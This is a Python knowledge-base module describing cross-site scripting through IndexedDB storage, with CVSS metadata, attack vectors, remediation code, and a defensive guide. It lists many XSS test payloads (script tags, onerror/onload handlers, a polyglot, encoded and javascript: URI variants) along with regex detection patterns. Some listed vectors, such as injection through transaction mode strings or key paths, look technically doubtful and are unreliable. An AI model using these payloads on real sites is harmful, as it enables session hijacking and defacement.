#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easyprotech)
Dev: Brabus
Date: Sat 25 Oct 2025 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: IndexedDB XSS Context - Comprehensive Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in IndexedDB Context",
    # Metadata for SIEM/Triage Integration
    "severity": "medium",
    "cvss_score": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "indexeddb", "client-storage", "offline-storage", "persistent"],
    "description": """
IndexedDB XSS occurs when user input is stored in IndexedDB and later reflected into the DOM
without proper sanitization. IndexedDB is a powerful client-side storage system that allows
storing large amounts of structured data in the browser. When malicious content is stored
in IndexedDB and then retrieved and displayed, it can lead to persistent XSS attacks that
survive page refreshes and even browser restarts.

VULNERABILITY CONTEXT:
IndexedDB XSS typically happens when:
1. User-generated content is stored without sanitization
2. Application data is retrieved and displayed in HTML context
3. Offline-stored content is rendered when online
4. Cached user profiles or settings contain malicious data
5. Synchronization between server and client introduces XSS

Common in:
- Offline-first applications
- Progressive Web Apps (PWA)
- Note-taking applications
- Document editors
- Profile management systems
- Settings/preferences storage
- Message archiving
- Content management systems

SEVERITY: MEDIUM
IndexedDB XSS provides persistence across sessions and can survive cache clearing in some cases.
However, it requires user interaction and is generally less immediate than other XSS types.
""",
    "attack_vector": """
INDEXEDDB XSS ATTACK VECTORS:

1. USER PROFILE STORAGE INJECTION:
   Storing user profile data:
   const transaction = db.transaction(['users'], 'readwrite');
   const store = transaction.objectStore('users');

   store.add({
     id: userId,
     name: USER_INPUT,  // Profile name injection
     email: 'user@example.com',
     avatar: '/default.png'
   });

   Later retrieval and display:
   const user = storedUserData.name;
   document.getElementById('profile-name').innerHTML = user;  // XSS execution

2. MESSAGE STORAGE INJECTION:
   Chat message storage:
   const messageStore = db.transaction(['messages'], 'readwrite').objectStore('messages');

   messageStore.add({
     id: Date.now(),
     from: 'user123',
     content: USER_INPUT,  // Message content
     timestamp: Date.now(),
     type: 'text'
   });

   Display message:
   messageDiv.innerHTML = '<b>' + message.from + ':</b> ' + message.content;

3. SETTINGS STORAGE INJECTION:
   Application settings:
   const settings = {
     theme: 'dark',
     language: 'en',
     customCSS: USER_INPUT,  // Custom CSS injection
     notifications: true
   };

   Later application:
   const style = document.createElement('style');
   style.textContent = settings.customCSS;  // XSS in CSS
   document.head.appendChild(style);

4. OFFLINE CONTENT INJECTION:
   Offline page content:
   const offlineStore = db.transaction(['offline'], 'readwrite').objectStore('offline');

   offlineStore.add({
     url: '/article/123',
     title: USER_INPUT,  // Article title
     content: 'Article content...',
     lastModified: Date.now()
   });

   Offline display:
   document.title = article.title;  // XSS in title
   document.getElementById('content').innerHTML = article.content;

5. CACHE MANIPULATION:
   Storing cached responses:
   const cacheStore = db.transaction(['cache'], 'readwrite').objectStore('cache');

   cacheStore.add({
     request: '/api/user',
     response: USER_INPUT,  // Cached response
     timestamp: Date.now(),
     expires: Date.now() + 3600000
   });

   Using cached data:
   const userData = JSON.parse(cachedResponse.response);
   document.getElementById('user-info').innerHTML = userData.html;

ADVANCED INDEXEDDB XSS TECHNIQUES:

6. OBJECT STORE SCHEMA INJECTION:
   Creating malicious object stores:
   const maliciousStore = {
     name: '<script>alert(1)</script>',  // Store name injection
     keyPath: 'id',
     autoIncrement: false
   };

   db.createObjectStore(maliciousStore.name, {
     keyPath: maliciousStore.keyPath
   });

7. INDEX NAME INJECTION:
   Creating indexes with XSS:
   const maliciousIndex = {
     name: '<img src=x onerror=alert(1)>',  // Index name
     keyPath: 'name',
     unique: false
   };

   store.createIndex(maliciousIndex.name, maliciousIndex.keyPath);

8. TRANSACTION NAME INJECTION:
   Transaction naming with XSS:
   const transaction = db.transaction(['users'],
     '<script>alert(1)</script>'  // Transaction name
   );

9. DATABASE NAME INJECTION:
   Opening database with XSS name:
   const request = indexedDB.open('<script>alert(1)</script>', 1);

10. VERSION CHANGE INJECTION:
    Database version upgrade with XSS:
    request.onupgradeneeded = function(event) {
      const db = event.target.result;

      // Inject XSS into version change
      const script = document.createElement('script');
      script.textContent = USER_INPUT;  // Version script injection
      document.head.appendChild(script);
    };

11. CURSOR ITERATION INJECTION:
    Iterating over data with XSS:
    const transaction = db.transaction(['messages']);
    const store = transaction.objectStore('messages');
    const request = store.openCursor();

    request.onsuccess = function(event) {
      const cursor = event.target.result;
      if (cursor) {
        const message = cursor.value;
        displayMessage(message);  // Potential XSS in display
        cursor.continue();
      }
    };

12. BLOB STORAGE INJECTION:
    Storing binary data with XSS:
    const blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});
    const blobStore = db.transaction(['blobs'], 'readwrite').objectStore('blobs');

    blobStore.add({
      id: 'user-content',
      data: blob,
      type: 'html'
    });

13. KEY PATH INJECTION:
    Object store with malicious key path:
    const maliciousKeyPath = 'data.<script>alert(1)</script>.value';

    db.createObjectStore('objects', {keyPath: maliciousKeyPath});

14. CONSTRAINT INJECTION:
    Unique constraints with XSS:
    store.createIndex('unique_index', '<script>alert(1)</script>', {unique: true});

15. EVENT HANDLER INJECTION:
    Database event handlers with XSS:
    request.onerror = function(event) {
      // Error message might contain XSS
      showError(event.target.error.message);
    };

INDEXEDDB-SPECIFIC BYPASSES:

16. POLYGLOT STORAGE:
    Storing polyglot payloads that work in multiple contexts:
    javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>

17. ENCODING BYPASSES:
    Storing encoded XSS:
    %3Cscript%3Ealert(1)%3C/script%3E
    \\u003cscript\\u003ealert(1)\\u003c/script\\u003e

18. COMMENT-BASED INJECTION:
    Storing XSS in comments:
    <!-- <script>alert(1)</script> -->
    /* <script>alert(1)</script> */

19. NULL BYTE INJECTION:
    <script>alert(1)</script>%00
    May bypass some validation

20. NEWLINE INJECTION:
    \\n<script>alert(1)</script>
    Can break parsing context

REAL-WORLD ATTACK SCENARIOS:

21. NOTE-TAKING APPLICATION:
    - User saves note: <script>alert('XSS')</script>
    - Note stored in IndexedDB
    - Displayed when app loads
    - Persistent XSS across sessions

22. OFFLINE EMAIL CLIENT:
    - Email stored offline
    - Subject: <script>alert(1)</script>
    - Subject displayed in list
    - Affects all offline usage

23. E-COMMERCE WISHLIST:
    - Product names in wishlist
    - Product: <script>alert(1)</script>
    - Stored offline for later purchase
    - Executes when viewing wishlist

24. SOCIAL MEDIA OFFLINE:
    - Posts cached for offline viewing
    - Post content: <script>alert(1)</script>
    - Executes when viewing offline

25. DOCUMENT COLLABORATION:
    - Collaborative editing
    - Comment: <script>alert(1)</script>
    - Stored in IndexedDB for sync
    - Affects all collaborators

26. PROFILE CUSTOMIZATION:
    - Custom user profiles
    - Bio: <script>alert(1)</script>
    - Displayed on profile page
    - Persistent across logins

27. SETTINGS PERSISTENCE:
    - User preferences
    - Custom theme: <script>alert(1)</script>
    - Applied to all pages
    - Global XSS effect

INDEXEDDB XSS DETECTION:

28. MANUAL TESTING:
    - DevTools Application > IndexedDB inspection
    - Check stored data for malicious content
    - Test data retrieval and display
    - Monitor for script execution

29. AUTOMATED SCANNING:
    - IndexedDB content analysis
    - Stored data validation
    - Retrieval and display testing
    - Offline functionality testing

30. BROWSER EXTENSIONS:
    - IndexedDB monitoring extensions
    - Content inspection tools
    - Storage manipulation detection
""",
    "remediation": """
INDEXEDDB XSS DEFENSE STRATEGY:

1. DATA SANITIZATION BEFORE STORAGE (PRIMARY DEFENSE):
   Sanitize all data before storing in IndexedDB:

   JavaScript sanitization:
   const DOMPurify = require('dompurify');

   function sanitizeForStorage(data) {
     if (typeof data === 'string') {
       return DOMPurify.sanitize(data, {
         ALLOWED_TAGS: [],  // No HTML tags allowed
         ALLOWED_ATTR: []
       });
     }
     return data;
   }

   Python backend sanitization:
   import bleach
   clean_data = bleach.clean(user_input, tags=[], strip=True)

2. DATA VALIDATION BEFORE DISPLAY:
   Validate data when retrieving from IndexedDB:

   function validateStoredData(data) {
     // Check data type
     if (typeof data !== 'string') return data;

     // Length limits
     if (data.length > 10000) return '[Content too long]';

     // Content validation
     const dangerousPatterns = [
       /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
       /javascript:/gi,
       /vbscript:/gi,
       /on\w+\s*=/gi
     ];

     for (const pattern of dangerousPatterns) {
       if (pattern.test(data)) {
         return '[Invalid content removed]';
       }
     }

     return data;
   }

3. SAFE RETRIEVAL METHODS:
   Use safe methods for displaying stored data:

   // BAD - Direct HTML insertion
   element.innerHTML = storedData;

   // GOOD - Safe text display
   element.textContent = storedData;

   // GOOD - Controlled HTML (if needed)
   element.innerHTML = DOMPurify.sanitize(storedData);

4. DATABASE SCHEMA VALIDATION:
   Define strict database schemas:

   const DB_SCHEMA = {
     users: {
       name: {type: 'string', maxLength: 50, pattern: /^[a-zA-Z0-9\s]+$/},
       email: {type: 'string', pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/},
       avatar: {type: 'string', pattern: /^https?:\/\/.+/}
     },
     messages: {
       content: {type: 'string', maxLength: 1000},
       timestamp: {type: 'number'},
       type: {type: 'string', enum: ['text', 'image', 'file']}
     }
   };

5. INPUT VALIDATION:
   Validate data before storage:

   function validateUserInput(input, schema) {
     if (schema.maxLength && input.length > schema.maxLength) {
       throw new Error('Input too long');
     }

     if (schema.pattern && !schema.pattern.test(input)) {
       throw new Error('Invalid input format');
     }

     if (schema.enum && !schema.enum.includes(input)) {
       throw new Error('Invalid input value');
     }

     return true;
   }

6. ENCRYPTION FOR SENSITIVE DATA:
   Encrypt sensitive data before storage:

   async function storeEncryptedData(key, data) {
     const encrypted = await encryptData(data);
     const store = db.transaction(['sensitive'], 'readwrite').objectStore('sensitive');
     store.add({key: key, data: encrypted});
   }

7. VERSION CONTROL AND MIGRATION:
   Handle database version upgrades safely:

   const DB_VERSION = 2;

   request.onupgradeneeded = function(event) {
     const db = event.target.result;
     const oldVersion = event.oldVersion;

     if (oldVersion < 2) {
       // Migrate existing data and sanitize
       migrateAndSanitizeData(db);
     }
   };

8. ERROR HANDLING:
   Proper error handling without information disclosure:

   request.onerror = function(event) {
     logger.error('IndexedDB error', {
       error: event.target.error.message,
       operation: 'unknown'
     });

     // Show generic error to user
     showGenericError();
   };

9. STORAGE QUOTAS AND LIMITS:
   Implement storage limits:

   const MAX_DB_SIZE = 50 * 1024 * 1024;  // 50MB
   const MAX_RECORD_SIZE = 1024 * 1024;   // 1MB per record

   function checkStorageQuota() {
     if ('storage' in navigator && 'estimate' in navigator.storage) {
       navigator.storage.estimate().then(function(estimate) {
         if (estimate.usage > MAX_DB_SIZE) {
           cleanupOldData();
         }
       });
     }
   }

10. SECURE DEFAULT VALUES:
    Use safe defaults:

    const DEFAULT_SETTINGS = {
      theme: 'light',
      language: 'en',
      notifications: true,
      customCSS: ''  // Empty, not null
    };

11. REGULAR DATA CLEANUP:
    Implement data cleanup routines:

    function cleanupMaliciousData() {
      const transaction = db.transaction(['users'], 'readwrite');
      const store = transaction.objectStore('users');

      store.openCursor().onsuccess = function(event) {
        const cursor = event.target.result;
        if (cursor) {
          const user = cursor.value;

          // Check for malicious content
          if (containsMaliciousContent(user.name)) {
            // Sanitize or remove
            user.name = sanitizeContent(user.name);
            cursor.update(user);
          }

          cursor.continue();
        }
      };
    }

12. CSP FOR INDEXEDDB APPLICATIONS:
    Content Security Policy:

    Content-Security-Policy:
      default-src 'self';
      script-src 'self' 'nonce-{random}';
      style-src 'self' 'unsafe-inline';  // If custom CSS is needed
      img-src 'self' data: blob:;
      connect-src 'self';
      object-src 'none';

13. OFFLINE SECURITY:
    Secure offline functionality:

    // Validate data when coming online
    window.addEventListener('online', function() {
      validateAllStoredData();
      syncWithServer();
    });

14. LOGGING AND MONITORING:
    Comprehensive IndexedDB monitoring:

    function logDatabaseOperation(operation, details) {
      logger.info('IndexedDB operation', {
        operation: operation,
        details: details,
        timestamp: new Date().toISOString(),
        userId: currentUser.id
      });
    }

15. TESTING AND VALIDATION:
    Regular security testing:

    Automated tests:
    - IndexedDB content validation
    - Storage and retrieval testing
    - Offline functionality testing
    - Data sanitization testing

    Manual tests:
    - DevTools Application > IndexedDB inspection
    - Data storage and display testing
    - Offline behavior testing

SECURITY TESTING PAYLOADS:

Basic IndexedDB XSS:
<script>alert('IndexedDB XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Storage-specific payloads:
{"name": "<script>alert(1)</script>", "email": "test@example.com"}
{"content": "<script>alert(1)</script>", "type": "text"}
{"customCSS": "body{background:url('javascript:alert(1)')}"}

Advanced payloads:
javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)

INDEXEDDB SECURITY HEADERS:

Cache-Control: no-cache
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff

MONITORING METRICS:

Monitor for:
- Unusual data storage patterns
- Large data insertions
- Frequent database operations
- Storage quota violations
- Data validation failures

OWASP REFERENCES:
- OWASP Client-Side Storage Security
- OWASP HTML5 Security Cheat Sheet
- IndexedDB Security Best Practices
- Browser Storage Security Guide
""",
}
